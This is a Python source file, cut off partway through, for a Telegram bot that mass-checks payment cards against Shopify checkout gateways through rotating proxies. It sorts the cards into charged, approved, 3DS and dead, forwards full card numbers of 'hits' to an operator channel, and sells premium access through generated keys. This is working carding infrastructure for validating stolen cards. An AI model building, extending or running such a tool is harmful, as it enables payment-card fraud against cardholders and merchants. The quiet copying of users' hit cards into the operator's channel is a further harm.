from telethon import TelegramClient, events, Button
from telethon.tl.custom.message import Message as _TLMessage
from telethon.tl.functions.channels import GetParticipantRequest
import asyncio
import itertools
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime, timedelta

import config
from config import (
    API_ID, API_HASH, BOT_TOKEN,
    BOT_BRAND, OWNER_NAME, OWNER_USERNAME, OWNER_ID, DEV_LINE,
    PREMIUM_FILE, SITES_FILE, PROXY_FILE, USER_PROXY_FILE, USER_POOL_FILE,
    ADMIN_IDS, ADMIN_ID, _DEFAULT_ADMINS, _save_admin_ids,
    LIMITS, MASS_WORKERS,
    REQUIRED_CHANNEL_ID, REQUIRED_GROUP_ID,
    HITS_CHANNEL_ID, LOGS_CHANNEL_ID,
    CHANNEL_INVITE_LINK, GROUP_INVITE_LINK,
)
from emojis import pe, SEP
from keyboards import (
    _raw_post, raw_send, raw_edit, nav_edit,
    rows_main, rows_gates, rows_proxy, rows_admin, rows_admin_users,
    rows_admin_sites, rows_admin_proxy_pool, rows_stop,
)
from storage import (
    user_proxies, user_pool_enabled,
    load_user_proxies, save_user_proxies,
    load_user_pool, save_user_pool,
    get_user_proxy_list, set_user_proxies, remove_user_proxy,
    get_file_lines, load_premium_users, load_sites, load_proxies,
    is_admin, is_premium, get_user_limit,
    get_proxies_for_user, extract_cc, make_progress_bar,
)
from bin_db import get_bin_info, load_bins
from cards import build_result_card, checker_line
from check_engine import (
    check_card_with_retry, test_proxy, test_site, get_proxy_ip,
    clear_session_bad_sites, clear_error_log,
)
from keyboards import _send_notification, _pin_message_botapi

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions: dict = {}
pending_checks:  dict = {}

_orig_send_message = bot.send_message
_orig_edit_message = bot.edit_message
import re as _re

def _strip_tg_emoji(text):
    if not text:
        return text
    return _re.sub(r'<tg-emoji[^>]*>([^<]*)</tg-emoji>', r'\1', text)

def _is_doc_invalid(e):
    s = str(e).upper()
    return 'DOCUMENT_INVALID' in s or 'FILE_REFERENCE_INVALID' in s

_orig_tl_edit = _TLMessage.edit

async def _safe_tl_edit(self, *args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_tl_edit(self, *args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            new_args = list(args)
            if new_args and isinstance(new_args[0], str):
                new_args[0] = _strip_tg_emoji(new_args[0])
            if 'text' in kwargs:
                kwargs['text'] = _strip_tg_emoji(kwargs['text'])
            if 'message' in kwargs and isinstance(kwargs['message'], str):
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_tl_edit(self, *new_args, **kwargs)
        raise

_TLMessage.edit = _safe_tl_edit

async def _send_message_no_preview(*args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_send_message(*args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            if len(args) >= 2 and isinstance(args[1], str):
                args = (args[0], _strip_tg_emoji(args[1])) + args[2:]
            if 'message' in kwargs and isinstance(kwargs['message'], str):
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_send_message(*args, **kwargs)
        raise

async def _edit_message_no_preview(*args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_edit_message(*args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            if len(args) >= 3 and isinstance(args[2], str):
                args = args[:2] + (_strip_tg_emoji(args[2]),) + args[3:]
            if 'text' in kwargs and isinstance(kwargs['text'], str):
                kwargs['text'] = _strip_tg_emoji(kwargs['text'])
            if 'message' in kwargs and isinstance(kwargs['message'], str):
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_edit_message(*args, **kwargs)
        raise

bot.send_message = _send_message_no_preview
bot.edit_message = _edit_message_no_preview

# =============== FIXED MEMBERSHIP CHECK ===============
async def check_membership(uid: int) -> tuple[bool, bool, str]:
    channel_ok = False
    group_ok = False
    error_msg = ""
    try:
        await bot(GetParticipantRequest(REQUIRED_CHANNEL_ID, uid))
        channel_ok = True
    except Exception as e:
        error_msg = f"Channel check failed: {str(e)[:80]}"
    try:
        await bot(GetParticipantRequest(REQUIRED_GROUP_ID, uid))
        group_ok = True
    except Exception as e:
        if error_msg:
            error_msg += " | "
        error_msg += f"Group check failed: {str(e)[:80]}"
    return channel_ok, group_ok, error_msg

async def is_user_member(uid: int) -> bool:
    channel_ok, group_ok, _ = await check_membership(uid)
    return channel_ok and group_ok

# ----- Forward full card details to hits channel -----
async def forward_hit_to_channel(result: dict, user_id: int, hit_type: str):
    card = result['card']
    bin_info = await get_bin_info(card.split('|')[0])
    header = {
        'Charged': '💎 CHARGED',
        'Approved': '✅ APPROVED',
        '3DS': '⚠️ 3DS'
    }.get(hit_type, '🔔 HIT')
    msg = (
        f"<b>{header}</b>\n"
        f"<b>{SEP}</b>\n"
        f"🃏 <tg-spoiler>{card}</tg-spoiler>\n"
        f"💬 {result.get('message', '')[:80]}\n"
        f"🌐 Gateway: {result.get('gateway', 'Shopify')}\n"
        f"💰 Amount: {result.get('price', '-')}\n"
        f"🏦 {bin_info[3] or '?'} | {bin_info[4] or '?'} {bin_info[5] or ''}\n"
        f"👤 User: <a href='tg://user?id={user_id}'>{await get_display_name(user_id)}</a>"
    )
    try:
        await bot.send_message(HITS_CHANNEL_ID, msg, parse_mode='html')
    except Exception:
        pass

# ----- Send clean log to logs channel (no card numbers) -----
async def send_hit_log(user_id: int, result: dict, hit_type: str):
    if LOGS_CHANNEL_ID is None:
        return
    status_emoji = {
        'Charged': '💎',
        'Approved': '✅',
        '3DS': '⚠️'
    }.get(hit_type, '🔔')
    try:
        entity = await bot.get_entity(user_id)
        username = f"@{entity.username}" if entity.username else f"<a href='tg://user?id={user_id}'>User</a>"
    except:
        username = f"<a href='tg://user?id={user_id}'>User</a>"
    msg = (
        f"<b>HIT FOUND {status_emoji}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User</b> ➔ {username}\n"
        f"✨ <b>Status</b> ➔ {hit_type}\n"
        f"💵 <b>Price</b> ➔ {result.get('price', '-')}\n"
        f"🖥 <b>Response</b> ➔ {result.get('message', '')[:50]}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{DEV_LINE}"
    )
    try:
        await bot.send_message(LOGS_CHANNEL_ID, msg, parse_mode='html', link_preview=False)
    except Exception:
        pass

# ----- Send purchase log to logs channel -----
async def send_purchase_log(user_id: int, plan: str = "Premium", days: int = 1, limit: int = 2500):
    if LOGS_CHANNEL_ID is None:
        return
    try:
        entity = await bot.get_entity(user_id)
        username = f"@{entity.username}" if entity.username else f"<a href='tg://user?id={user_id}'>User</a>"
    except:
        username = f"<a href='tg://user?id={user_id}'>User</a>"
    msg = (
        f"🔥 <b>Purchase Successful</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"𝗨𝘀𝗲𝗿 : {username}\n"
        f"𝗣𝗹𝗮𝗻 : 👑 {plan}\n"
        f"𝗗𝗮𝘆𝘀 : {days} Day{'s' if days > 1 else ''}\n"
        f"𝗟𝗶𝗺𝗶𝘁 : {limit:,} cards/file\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Thanks for Purchase!"
    )
    try:
        await bot.send_message(LOGS_CHANNEL_ID, msg, parse_mode='html', link_preview=False)
    except Exception:
        pass

async def get_display_name(uid):
    try:
        entity = await bot.get_entity(uid)
        name   = getattr(entity, 'first_name', None) or ''
        lname  = getattr(entity, 'last_name',  None) or ''
        full   = (name + ' ' + lname).strip()
        return full if full else str(uid)
    except:
        return str(uid)

async def get_user_info(uid):
    try:
        entity   = await bot.get_entity(uid)
        name     = getattr(entity, 'first_name', None) or str(uid)
        username = getattr(entity, 'username', None)
        return name, username
    except:
        return str(uid), None

def _is_3ds(msg: str) -> bool:
    m = msg.lower()
    return any(x in m for x in ('3d secure', '3ds', 'authentication required', 'otp required'))

def _is_insuf(msg: str) -> bool:
    return 'insufficient' in msg.lower()

async def send_realtime_hit(user_id, result, hit_type):
    bin_info = await get_bin_info(result['card'].split('|')[0])
    result['bin_info'] = bin_info
    await forward_hit_to_channel(result, user_id, hit_type)
    await send_hit_log(user_id, result, hit_type)
    name, username = await get_user_info(user_id)
    checker_name = name if username else str(user_id)
    msg = build_result_card(result, bin_info, user_id, checker_name)
    msg_id = await asyncio.to_thread(_send_notification, user_id, msg)
    if msg_id and hit_type == "Charged":
        await asyncio.to_thread(_pin_message_botapi, user_id, msg_id)

async def send_insufficient_log(user_id, result):
    from cards import _clean_response
    card     = result['card']
    resp_msg = _clean_response(result.get('message', ''))
    await bot.send_message(
        user_id,
        pe(
            f"💸 <b>Insufficient Funds</b>\n"
            f"<b>{SEP}</b>\n"
            f"🃏 <b>Card</b>    »  <tg-spoiler>{card}</tg-spoiler>\n"
            f"💬 <b>Reason</b>  »  {resp_msg}\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        ),
        parse_mode='html'
    )

async def update_mass_progress(user_id, message_id, results, checked, last_res=None):
    bar    = make_progress_bar(checked, results['total'])
    latest = ""
    if last_res:
        st    = last_res['status']
        msg_r = last_res.get('message', '') or ''
        if st == 'Charged':
            se = "💎"; label = "CHARGED"
        elif st == 'Approved':
            se = "✅"; label = "APPROVED"
        elif _is_insuf(msg_r):
            se = "💸"; label = "Insufficient"
        elif _is_3ds(msg_r):
            se = "⚠️"; label = "3DS"
        else:
            se = "🚫"; label = "Declined"
        reason = msg_r[:45] if msg_r else label
        t = round(time.time() - results.get('last_card_time', time.time()), 2)
        latest = (
            f"\n<b>{SEP}</b>\n"
            f"⚡ <b>Last Result</b>\n"
            f"{se}  <tg-spoiler>{last_res['card']}</tg-spoiler>\n"
            f"💫  {reason}  ·  {t}s"
        )
    text = pe(
        f"<b>🔥 Mass Check  —  Running</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Total</b>      »  {results['total']}\n"
        f"☄️ <b>Checked</b>   »  {checked}\n"
        f"💎 <b>Charged</b>   »  {len(results['charged'])}\n"
        f"✅ <b>Approved</b>  »  {len(results['approved'])}\n"
        f"⚠️ <b>3DS</b>       »  {len(results.get('tds', []))}\n"
        f"<code>{bar}</code>"
        f"{latest}"
    )
    await raw_edit(user_id, message_id, text, rows_stop())

def _file_row(label, r):
    gate  = r.get('gateway', 'Shopify')
    price = r.get('price', '-')
    bi    = r.get('bin_info')
    if bi:
        brand, btype, level, bank, country, flag = bi
        bank_line = f"  Bank    : {bank} | {country} {flag} | {brand} {btype} {level}\n"
    else:
        bank_line = ""
    return (
        f"  [{label}]\n"
        f"  CC      : {r['card']}\n"
        f"  Gateway : {gate}\n"
        f"  Amount  : {price}\n"
        f"  Message : {r.get('message','')[:80]}\n"
        + bank_line +
        f"  {'─'*36}\n"
    )

async def send_final_results(user_id, results):
    elapsed  = int(time.time() - results['start_time'])
    h, m, s  = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    bar      = make_progress_bar(results['total'], results['total'])
    ch_count = len(results['charged'])
    ap_count = len(results['approved'])
    td_count = len(results.get('tds', []))
    cname    = await get_display_name(user_id)
    time_fmt = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
    summary  = pe(
        f"<b>🔥 Mass Check  —  Complete</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"📋 <b>Total</b>      »  {results['total']}\n"
        f"💎 <b>Charged</b>   »  {ch_count}\n"
        f"✅ <b>Approved</b>  »  {ap_count}\n"
        f"⚠️ <b>3DS</b>       »  {td_count}\n"
        f"❌ <b>Dead</b>      »  {len(results.get('dead', []))}\n"
        f"<code>{bar}</code>"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"⏱️ <b>Time</b>  »  {time_fmt}\n"
        f"<b>{SEP}</b>\n"
        f"{checker_line(user_id, cname)}\n"
        f"{DEV_LINE}"
    )
    await bot.send_message(user_id, summary, parse_mode='html')

    if results['charged']:
        D = "─" * 44
        lines = [f"{D}\n  {BOT_BRAND}  ◈  💎 CHARGED HITS\n{D}\n\n"]
        for r in results['charged']:
            lines.append(_file_row("💎 CHARGED", r))
        lines.append(f"\n  Charged  »  {ch_count}\n{D}\n")
        async with aiofiles.open("charged.txt", 'w') as f:
            await f.write("".join(lines))
        await bot.send_file(
            user_id, "charged.txt",
            caption=pe(f"💎 <b>Charged Hits  »  {ch_count}</b>\n{DEV_LINE}"),
            parse_mode='html'
        )
        try: os.remove("charged.txt")
        except: pass

    combo = results['approved'] + results.get('tds', [])
    if combo:
        D = "─" * 44
        lines = [f"{D}\n  {BOT_BRAND}  ◈  HITS FILE\n{D}\n\n"]
        if results['approved']:
            lines.append(f"  ── ✅ APPROVED  ({ap_count}) ────────────────────\n\n")
            for r in results['approved']:
                lines.append(_file_row("✅ APPROVED", r))
        if results.get('tds'):
            lines.append(f"\n  ── ⚠️  3DS  ({td_count}) ──────────────────────\n\n")
            for r in results['tds']:
                lines.append(_file_row("⚠️ 3DS", r))
        lines.append(f"\n{D}\n  Approved: {ap_count}  ·  3DS: {td_count}\n{D}\n")
        async with aiofiles.open("approved.txt", 'w') as f:
            await f.write("".join(lines))
        caption = pe(
            f"✅ <b>Hits File</b>\n"
            f"<b>{SEP}</b>\n"
            f"✅ <b>Approved</b>  »  {ap_count}\n"
            f"⚠️ <b>3DS</b>       »  {td_count}\n"
            f"{DEV_LINE}"
        )
        await bot.send_file(user_id, "approved.txt", caption=caption, parse_mode='html')
        try: os.remove("approved.txt")
        except: pass

    error_path = os.path.join(os.path.dirname(__file__), 'error.txt')
    try:
        async with aiofiles.open(error_path, 'r') as f:
            err_content = await f.read()
        err_lines = [l for l in err_content.strip().splitlines() if l.strip()]
        if err_lines:
            await bot.send_file(
                user_id, error_path,
                caption=pe(
                    f"❌ <b>Failed Cards  »  {len(err_lines)}</b>\n"
                    f"<b>{SEP}</b>\n"
                    f"⚠️ Cards that errored after all retries\n"
                    f"{DEV_LINE}"
                ),
                parse_mode='html'
            )
    except FileNotFoundError:
        pass
    except Exception:
        pass

async def run_mass_check(user_id, cards, progress_msg_id):
    session_key = f"{user_id}_{progress_msg_id}"
    clear_session_bad_sites()
    clear_error_log()
    active_sessions[session_key] = {'paused': False}
    all_results = {
        'charged': [], 'approved': [], 'dead': [], 'tds': [],
        'total': len(cards), 'start_time': time.time(), 'last_card_time': time.time(),
    }
    proxy_pool = list(get_proxies_for_user(user_id) or load_proxies())
    proxy_iter = itertools.cycle(proxy_pool) if proxy_pool else None
    proxy_lock = asyncio.Lock()

    async def _next_proxy():
        if not proxy_iter:
            return None
        async with proxy_lock:
            return next(proxy_iter)

    try:
        queue       = asyncio.Queue()
        last_update = [time.time()]
        for c in cards:
            queue.put_nowait(c)

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                sess = active_sessions.get(session_key)
                if not sess:
                    break
                while sess.get('paused', False):
                    await asyncio.sleep(1)
                    sess = active_sessions.get(session_key)
                    if not sess:
                        return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                cur_sites   = load_sites()
                start_proxy = await _next_proxy()
                if not cur_sites or not proxy_pool:
                    break
                t0 = time.time()
                result = {'card': card, 'status': 'Dead', 'message': 'Error'}
                try:
                    result = await check_card_with_retry(card, cur_sites, proxy_pool, max_retries=3)
                    result['time'] = round(time.time() - t0, 2)
                    all_results['last_card_time'] = time.time()
                    st    = result.get('status', '')
                    msg_r = result.get('message', '') or ''
                    if st == 'Charged':
                        bin_info = await get_bin_info(card.split('|')[0])
                        result['bin_info'] = bin_info
                        all_results['charged'].append(result)
                        await send_realtime_hit(user_id, result, 'Charged')
                    elif st == 'Approved':
                        bin_info = await get_bin_info(card.split('|')[0])
                        result['bin_info'] = bin_info
                        all_results['approved'].append(result)
                        await send_realtime_hit(user_id, result, 'Approved')
                    elif _is_3ds(msg_r):
                        bin_info = await get_bin_info(card.split('|')[0])
                        result['bin_info'] = bin_info
                        all_results['tds'].append(result)
                        await send_realtime_hit(user_id, result, '3DS')
                    elif _is_insuf(msg_r):
                        all_results['approved'].append(result)
                        await send_insufficient_log(user_id, result)
                    else:
                        all_results['dead'].append(result)
                except Exception:
                    all_results['dead'].append(result)

                checked = (len(all_results['charged']) + len(all_results['approved']) +
                           len(all_results['dead']) + len(all_results.get('tds', [])))
                now = time.time()
                if now - last_update[0] >= 3:
                    last_update[0] = now
                    try:
                        await update_mass_progress(user_id, progress_msg_id, all_results, checked, result)
                    except Exception:
                        pass

        workers = [asyncio.create_task(worker()) for _ in range(min(MASS_WORKERS, len(cards)))]
        await asyncio.gather(*workers)

    except Exception:
        pass
    finally:
        active_sessions.pop(session_key, None)
        await send_final_results(user_id, all_results)

def _admin_panel_text():
    pcount  = len(load_premium_users())
    scount  = len(load_sites())
    prcount = len(load_proxies())
    return pe(
        f"<b>👑 Admin Panel</b>  —  <b>{BOT_BRAND}</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"🟢 <b>Status</b>      »  Online\n"
        f"👤 <b>Users</b>       »  {pcount} trusted\n"
        f"🌐 <b>Sites</b>        »  {scount} loaded\n"
        f"📡 <b>Proxy Pool</b>  »  {prcount} proxies"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )

# =============== VERIFICATION UI ===============
async def show_verification_screen(event_or_uid, edit_msg_id=None, extra_info=""):
    text = pe(
        f"🔒 <b>Access Restricted</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"★ You must join our <b>channel</b> and <b>group</b> to use this bot.\n"
        f"Tap the buttons below to join, then tap <b>Verify Joined</b>."
        f"{extra_info}"
        f"</blockquote>\n"
        f"<b>{SEP}</b>"
    )
    kb = [
        [{"text": "📢 Join Channel", "url": CHANNEL_INVITE_LINK}],
        [{"text": "👥 Join Group",   "url": GROUP_INVITE_LINK}],
        [{"text": "✅ Verify Joined", "callback_data": "verify_joined"}],
    ]
    if isinstance(event_or_uid, int):
        uid = event_or_uid
        if edit_msg_id:
            await nav_edit(uid, edit_msg_id, text, kb)
        else:
            await raw_send(uid, text, kb)
    else:
        event = event_or_uid
        if edit_msg_id:
            await nav_edit(event.chat_id, edit_msg_id, text, kb)
        else:
            await raw_send(event.chat_id, text, kb, reply_to=event.message.id)

# =============== START ===============
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id
    chat_id = event.chat_id
    in_group = (chat_id != uid)

    channel_ok, group_ok, error = await check_membership(uid)

    if not channel_ok or not group_ok:
        missing = []
        if not channel_ok: missing.append("Channel")
        if not group_ok: missing.append("Group")
        extra = f"\n\n<b>Missing:</b> {', '.join(missing)}\n"
        if error:
            extra += f"\n<code>Error: {error}</code>"
        await show_verification_screen(event, extra_info=extra)
        return

    if not in_group:
        try:
            rm_msg = await bot.send_message(uid, "\u200b", buttons=Button.clear())
            await asyncio.sleep(0.3)
            await bot.delete_messages(uid, rm_msg.id)
        except Exception:
            pass

    try:
        sender    = await event.get_sender()
        username  = f"@{sender.username}" if sender.username else f"ID:{uid}"
        firstname = sender.first_name or "User"
    except:
        username  = f"ID:{uid}"
        firstname = "User"

    lim = get_user_limit(uid)
    if is_admin(uid):
        status_icon = "👑"; status_line = "Admin"
    elif is_premium(uid):
        status_icon = "✅"; status_line = "Premium"
    else:
        status_icon = "🚫"; status_line = "No Access"

    text = pe(
        f"<b>⚡ Welcome, {firstname}!</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"👤 <b>User</b>     »  {username}\n"
        f"🆔 <b>ID</b>       »  <code>{uid}</code>\n"
        f"{status_icon} <b>Status</b>  »  {status_line}\n"
        f"📋 <b>Limit</b>   »  {lim if lim else '—'} cards/file"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"Select an option below to get started.\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    dest = chat_id if in_group else uid
    await raw_send(dest, text, rows_main(),
                   reply_to=event.message.id if in_group else None)

# =============== VERIFY CALLBACK ===============
@bot.on(events.CallbackQuery(pattern=b"verify_joined"))
async def cb_verify(event):
    uid = event.sender_id
    channel_ok, group_ok, error = await check_membership(uid)

    if channel_ok and group_ok:
        await event.answer("✅ Verified! Welcome.", alert=False)
        try:
            sender    = await bot.get_entity(uid)
            username  = f"@{sender.username}" if sender.username else f"ID:{uid}"
            firstname = sender.first_name or "User"
        except:
            username  = f"ID:{uid}"
            firstname = "User"

        lim = get_user_limit(uid)
        if is_admin(uid):
            status_icon = "👑"; status_line = "Admin"
        elif is_premium(uid):
            status_icon = "✅"; status_line = "Premium"
        else:
            status_icon = "🚫"; status_line = "No Access"

        text = pe(
            f"<b>⚡ Welcome, {firstname}!</b>\n"
            f"<b>{SEP}</b>\n"
            f"<blockquote>"
            f"👤 <b>User</b>     »  {username}\n"
            f"🆔 <b>ID</b>       »  <code>{uid}</code>\n"
            f"{status_icon} <b>Status</b>  »  {status_line}\n"
            f"📋 <b>Limit</b>   »  {lim if lim else '—'} cards/file"
            f"</blockquote>\n"
            f"<b>{SEP}</b>\n"
            f"Select an option below to get started.\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        )
        await nav_edit(event.chat_id, event.message_id, text, rows_main())
    else:
        missing = []
        if not channel_ok: missing.append("Channel")
        if not group_ok: missing.append("Group")
        msg = f"❌ You haven't joined: {', '.join(missing)}. Please join and try again."
        if error:
            msg += f"\n(Error: {error})"
        await event.answer(msg, alert=True)

# =============== CHECKME ===============
@bot.on(events.NewMessage(pattern='/checkme'))
async def checkme_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply("❌ Admin only.")
        return
    channel_ok, group_ok, error = await check_membership(uid)
    status = (
        f"Channel: {'✅' if channel_ok else '❌'}\n"
        f"Group:   {'✅' if group_ok else '❌'}\n"
        f"Error:   {error or 'None'}"
    )
    await event.reply(f"<b>Membership Status</b>\n{status}", parse_mode='html')

# =============== KEY SYSTEM ===============
PREMIUM_DB = "premium_users.json"

def load_premium_users_dict():
    if not os.path.exists(PREMIUM_DB):
        if os.path.exists(PREMIUM_FILE):
            with open(PREMIUM_FILE, 'r') as f:
                old_list = [l.strip() for l in f if l.strip()]
            default = {str(uid): None for uid in ADMIN_IDS}
            for uid in old_list:
                default[uid] = None
            save_premium_users_dict(default)
            return default
        default = {str(uid): None for uid in ADMIN_IDS}
        save_premium_users_dict(default)
        return default
    try:
        with open(PREMIUM_DB, 'r') as f:
            return json.load(f)
    except:
        return {str(uid): None for uid in ADMIN_IDS}

def save_premium_users_dict(data):
    with open(PREMIUM_DB, 'w') as f:
        json.dump(data, f, indent=4)

def add_premium_user(user_id, expiry_timestamp=None):
    data = load_premium_users_dict()
    uid = str(user_id)
    data[uid] = expiry_timestamp
    save_premium_users_dict(data)
    return True

def remove_premium_user(user_id):
    data = load_premium_users_dict()
    uid = str(user_id)
    if uid in data:
        del data[uid]
        save_premium_users_dict(data)
        return True
    return False

async def cleanup_expired_premium():
    while True:
        await asyncio.sleep(3600)
        data = load_premium_users_dict()
        now = datetime.now().timestamp()
        changed = False
        for uid, expiry in list(data.items()):
            if expiry is not None and now > float(expiry):
                del data[uid]
                changed = True
        if changed:
            save_premium_users_dict(data)
            print("🗑️ Cleaned up expired premium users.")

def generate_key():
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))
    return f"ZERO_{random_part}"

async def load_keys():
    if not os.path.exists("keys.json"):
        return {}
    try:
        with open("keys.json", 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_keys(keys):
    with open("keys.json", 'w') as f:
        json.dump(keys, f, indent=4)

# =============== /GENKEYS ===============
@bot.on(events.NewMessage(pattern='/genkeys'))
async def genkeys_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ Access Denied. Admin only."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) < 4 or len(parts) > 5:
            await event.reply(pe("📝 Usage: <code>/genkeys amount hours user_limit [price]</code>"), parse_mode='html')
            return
        amount = int(parts[1])
        hours = int(parts[2])
        user_limit = int(parts[3])
        price = float(parts[4]) if len(parts) == 5 else 0.0
        keys_data = await load_keys()
        generated_keys = []
        created_at = datetime.now()
        for _ in range(amount):
            key = generate_key()
            expiry_time = created_at + timedelta(hours=hours)
            keys_data[key] = {
                'type': 'time_limit',
                'hours': hours,
                'expiry': expiry_time.isoformat(),
                'user_limit': user_limit,
                'used_count': 0,
                'used_by': [],
                'created_at': created_at.isoformat(),
                'created_by': event.sender_id,
                'price': price
            }
            generated_keys.append(key)
        await save_keys(keys_data)
        days_display = f"{hours} hours" if hours < 24 else f"{hours // 24} days"
        price_display = f"${price:.2f}" if price else "Free"
        keys_text = "\n".join(f"┣ <code>{k}</code>" for k in generated_keys)
        await event.reply(premium_emoji(f"""⭐ Keys Generated   (x{amount})
━━━━━━━━━━━━━━━━━━
{keys_text}
┗ 📅 Period: {days_display}
           ┗ 👥 Users: {user_limit}
           ┗ 💰 Price: {price_display}

✅ Use <code>/redeem KEY</code> to redeem"""), parse_mode='html')
    except Exception as e:
        await event.reply(pe(f"❌ Error: {e}"), parse_mode='html')

# =============== /REDEEM ===============
@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    user_id = event.sender_id
    if not await is_user_member(user_id):
        await show_verification_screen(event)
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(pe("📝 Usage: <code>/redeem KEY</code>"), parse_mode='html')
            return
        key = parts[1].upper()
        keys_data = await load_keys()
        if key not in keys_data:
            await event.reply(pe("❌ Invalid Key!"), parse_mode='html')
            return
        key_data = keys_data[key]
        if key_data.get('type') == 'time_limit':
            expiry = datetime.fromisoformat(key_data['expiry'])
            current_date = datetime.now()
            if current_date > expiry:
                await event.reply(pe("❌ This key has EXPIRED!"), parse_mode='html')
                return
            if key_data['used_count'] >= key_data['user_limit']:
                await event.reply(pe(f"❌ This key has reached its limit"), parse_mode='html')
                return
            user_id_str = str(user_id)
            if user_id_str in key_data['used_by']:
                await event.reply(pe("❌ You have already used this key!"), parse_mode='html')
                return
            if is_premium(user_id):
                await event.reply(pe("❌ You already have premium access!"), parse_mode='html')
                return
            hours_display = key_data['hours']
            expiry_timestamp = (datetime.now() + timedelta(hours=hours_display)).timestamp()
            await add_premium_user(user_id, expiry_timestamp)
            key_data['used_count'] += 1
            key_data['used_by'].append(user_id_str)
            key_data['used_at'] = current_date.isoformat()
            keys_data[key] = key_data
            await save_keys(keys_data)
            days_display = f"{hours_display} hours" if hours_display < 24 else f"{hours_display // 24} days"
            await event.reply(premium_emoji(f"""🎉 Congratulations!
⭐ VIP Access Activated! 📅 Duration: {days_display}
"""), parse_mode='html')
        else:
            await event.reply(pe("❌ Unsupported key type."), parse_mode='html')
    except Exception as e:
        await event.reply(pe(f"❌ Error: {e}"), parse_mode='html')

# =============== /LISTPREMIUM (updated) ===============
@bot.on(events.NewMessage(pattern='/listpremium'))
async def list_premium_command(event):
    if not is_admin(event.sender_id):
        return
    data = load_premium_users_dict()
    if not data:
        await event.reply(pe("📭 No premium users found."), parse_mode='html')
        return
    now = datetime.now().timestamp()
    lines = []
    for uid, expiry in data.items():
        if expiry is None:
            lines.append(f"• <code>{uid}</code> (Permanent)")
        else:
            remaining = int(expiry - now)
            if remaining > 0:
                hours = remaining // 3600
                mins = (remaining % 3600) // 60
                lines.append(f"• <code>{uid}</code> ({hours}h {mins}m left)")
            else:
                lines.append(f"• <code>{uid}</code> (Expired)")
    await event.reply(pe(f"👑 Premium Users ({len(data)})\n\n" + "\n".join(lines)), parse_mode='html')

# =============== /ADDPREMIUM /REMOVEPREMIUM (updated) ===============
@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    if not is_admin(event.sender_id):
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(pe("📝 Usage: <code>/addpremium user_id</code> (permanent)"), parse_mode='html')
            return
        target_id = int(parts[1])
        if is_premium(target_id):
            await event.reply(pe(f"⚠️ User <code>{target_id}</code> is already premium."), parse_mode='html')
            return
        await add_premium_user(target_id, None)
        await event.reply(pe(f"✅ User <code>{target_id}</code> added as permanent premium."), parse_mode='html')
    except Exception as e:
        await event.reply(pe(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_command(event):
    if not is_admin(event.sender_id):
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(pe("📝 Usage: <code>/removepremium user_id</code>"), parse_mode='html')
            return
        target_id = int(parts[1])
        if target_id in ADMIN_IDS:
            await event.reply(pe("⚠️ Cannot remove admin from premium."), parse_mode='html')
            return
        if await remove_premium_user(target_id):
            await event.reply(pe(f"✅ User <code>{target_id}</code> removed from premium."), parse_mode='html')
        else:
            await event.reply(pe(f"⚠️ User <code>{target_id}</code> is not premium."), parse_mode='html')
    except Exception as e:
        await event.reply(pe(f"❌ Error: {e}"), parse_mode='html')

# =============== USER PROXY MANAGEMENT ===============
@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if not await is_user_member(user_id):
        await show_verification_screen(event)
        return
    if not is_premium(user_id):
        await event.reply(pe("❌ Only premium users can add proxies."), parse_mode='html')
        return
    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(pe("❌ Usage: /addproxy followed by proxies, one per line."), parse_mode='html')
            return
        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(pe("❌ No proxies provided."), parse_mode='html')
            return
        current_proxies = get_user_proxy_list(user_id)
